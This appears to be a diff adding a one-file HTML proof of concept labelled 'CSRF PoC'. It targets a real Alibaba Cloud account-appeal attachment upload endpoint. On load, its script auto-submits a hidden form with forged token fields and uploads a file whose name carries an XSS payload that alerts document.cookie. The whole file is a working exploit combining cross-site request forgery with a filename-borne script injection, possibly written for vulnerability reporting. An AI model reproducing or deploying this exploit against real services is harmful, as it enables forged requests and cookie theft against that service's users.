@@ -1,0 +1,39 @@
+<html>
+  <body>
+    <h1>CSRF PoC</h1>
+    <form id="csrf-form" action="https://account.alibabacloud.com/account_appeal_intl/uploadWorkOrderAttachments.json#test" method="POST" enctype="multipart/form-data">
+      <input type="hidden" name="_csrf_token_" value="attacker" />
+      <input type="hidden" name="sid" value="1679468035442931" />
+      <input type="hidden" name="noCaptcha_sid" value="test" />
+      <input type="hidden" name="noCaptcha_csessionid" value="test" />
+      
+      <input type="file" id="file-input" name="file" style="display:none" />
+      <input type="submit" value="Submit Request" />
+    </form>
+
+    <script>
+      function createAndSubmit() {
+        const fileInput = document.getElementById('file-input');
+        const form = document.getElementById('csrf-form');
+
+        // 1. Create the file content "test"
+        const content = "test";
+        const blob = new Blob([content], { type: 'image/png' });
+
+        // 2. Create a File object with the name "minimal.png"
+        const file = new File([blob], "<html id=test><html onbeforematch='alert(document.cookie);'><html hidden=until-found>", { type: 'image/png' });
+
+        // 3. Use DataTransfer to simulate a user selecting the file
+        const dataTransfer = new DataTransfer();
+        dataTransfer.items.add(file);
+        fileInput.files = dataTransfer.files;
+
+        // 4. Auto-submit the form
+        form.submit();
+      }
+
+      // Execute the function
+      createAndSubmit();
+    </script>
+  </body>
+</html>
